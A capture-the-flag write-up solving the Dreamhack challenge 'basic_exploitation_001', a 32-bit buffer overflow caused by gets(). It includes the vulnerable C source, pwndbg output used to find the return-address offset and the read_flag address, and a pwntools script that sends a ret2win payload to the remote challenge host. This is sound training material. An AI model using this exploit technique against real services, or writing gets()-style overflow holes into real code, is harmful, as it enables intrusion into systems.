# Write-up of the challenge "basic_exploitation_001"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The objective of this challenge is to perform simple **Buffer overflow**

## Program structure

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}

```


## Security breach

The vulnerability **gets(buf);**

## Solution

So this seems like a basic **ret2win** and we gotta overrwrite the **RIP** to make it point to **read_flag**. So while writing the address of read_flag we need to make sure it's **p32** becuase the program is **32-bit executeable**.

I used **cyclic pattern to find the RIP**:

```c
 EAX  0
 EBX  0xf7f9ee14 ◂— 0x233d0c /* '\x0c=#' */
 ECX  0
 EDX  0xf7fa08ec ◂— 0
 EDI  0xf7ffcc60 (_rtld_global_ro) ◂— 0
 ESI  0x80485f0 (__libc_csu_init) ◂— push ebp
 EBP  0x62616168 ('haab')
 ESP  0xffffcc40 ◂— 0x6261616a ('jaab')
 EIP  0x62616169 ('iaab')
```

```
pwndbg> cyclic -o iaab
Finding cyclic pattern of 4 bytes: b'iaab' (hex: 0x69616162)
Found at offset 132
```

After finding the offset we need to find the address of **read_flag**, here's what I did:

```
pwndbg> info functions read_flag
All functions matching regular expression "read_flag":

Non-debugging symbols:
0x080485b9  read_flag
pwndbg> 
```

After that our information gathering is complete and we can launch our **ret2win** easily!

solve.py: 

```python
from pwn import *

# p = process('./basic_exploitation_001')

p = remote('host8.dreamhack.games', 20286)

offset = 132

payload = b'A' * offset + p32(0x080485b9)

p.sendline(payload)

print(p.recvall(timeout=2))

p.close()

```

